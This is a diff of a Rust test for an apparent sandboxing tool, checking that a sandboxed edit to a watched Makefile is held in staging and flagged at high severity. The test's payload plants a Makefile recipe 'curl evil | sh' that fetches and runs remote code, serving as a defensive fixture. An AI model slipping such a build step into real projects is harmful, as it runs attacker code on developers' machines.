@@ -449,25 +449,30 @@ fn binds_of(staging: &pks_core::workspace::Staging) -> Vec<pks_sandbox::Bind> {
         .collect()
 }
 
-/// PRD FR-WS "Watched": the IDE can edit `Makefile`. The edit is not blocked,
-/// and the host reports it as a change against the snapshot.
+/// PRD FR-WS "Watched": the IDE edits `Makefile`. The edit is held in
+/// staging: the repo is unchanged, and the review reports the change.
 #[test]
-fn an_edit_to_a_watched_file_is_not_blocked_and_is_reported() -> TestResult {
+fn an_edit_to_a_watched_file_is_held_and_the_repo_is_unchanged() -> TestResult {
     let layout = Layout::new()?;
     let repo = &layout.repo;
     fs::write(repo.join("Makefile"), "all:\n\ttrue\n")?;
     let session = tempfile::tempdir()?;
-    pks_core::snapshot::create(repo, session.path())?;
-    let status = backend()?
-        .run(&layout.spec_running(
-            "printf 'all:\\n\\tcurl evil | sh\\n' > /workspace/Makefile; exit 0\n",
-        ))?;
-    assert!(status.success(), "{status}");
-    assert!(fs::read_to_string(repo.join("Makefile"))?.contains("curl evil"));
-    let findings = pks_core::workspace::watched_findings(repo, session.path())?;
-    assert_eq!(findings.len(), 1, "{findings:?}");
-    assert_eq!(findings[0].message, "modified Makefile");
-    assert_eq!(findings[0].severity, Severity::High);
+    let staging = pks_core::workspace::prepare(repo, session.path())?;
+    let mut spec =
+        layout.spec_running("printf 'all:\\n\\tcurl evil | sh\\n' > /workspace/Makefile; exit 0\n");
+    spec.binds = binds_of(&staging);
+    assert!(backend()?.run(&spec)?.success());
+
+    assert_eq!(fs::read_to_string(repo.join("Makefile"))?, "all:\n\ttrue\n");
+    let findings = pks_scan::staged::review(staging);
+    let watched: Vec<&Finding> = findings
+        .iter()
+        .filter(|f| f.rule.as_str() == "WS-WATCHED-CHANGE")
+        .collect();
+    assert_eq!(watched.len(), 1, "{findings:?}");
+    assert_eq!(watched[0].target, "Makefile");
+    assert_eq!(watched[0].severity, Severity::High);
+    assert!(watched[0].message.contains("changed Makefile"));
     Ok(())
 }
 
